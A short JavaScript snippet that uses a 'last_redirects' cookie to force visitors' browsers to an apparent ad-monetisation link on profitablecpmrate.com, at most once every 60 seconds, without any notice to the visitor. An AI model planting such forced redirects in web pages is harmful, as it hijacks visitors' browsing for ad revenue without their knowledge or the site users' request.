// Set the redirect time limit (in seconds)
const redirectTimeLimit = 60;

// Function to get a cookie value by name
function getCookie(name) {
    const match = document.cookie.match(new RegExp('(^| )' + name + '=([^;]+)'));
    return match ? match[2] : null;
}

// Function to set a cookie
function setCookie(name, value, expirationTime) {
    const date = new Date();
    date.setTime(date.getTime() + expirationTime * 1000); // Convert seconds to milliseconds
    document.cookie = name + "=" + value + "; expires=" + date.toUTCString() + "; path=/";
}

// Check if the 'last_redirects' cookie exists
const lastRedirectTime = getCookie('last_redirects');

if (!lastRedirectTime) {
    // Set the cookie and redirect if it doesn't exist
    setCookie('last_redirects', Math.floor(Date.now() / 1000), redirectTimeLimit);
    window.location.href = "https://www.profitablecpmrate.com/p4cpj2n8s?key=8fbf3b76933ef1668010630b3c52e4d1";
} else {
    // If the cookie exists, check the time difference
    const currentTime = Math.floor(Date.now() / 1000);
    if (currentTime - lastRedirectTime > redirectTimeLimit) {
        // Reset the cookie and redirect
        setCookie('last_redirects', currentTime, redirectTimeLimit);
        window.location.href = "https://www.profitablecpmrate.com/p4cpj2n8s?key=8fbf3b76933ef1668010630b3c52e4d1";
    }
}

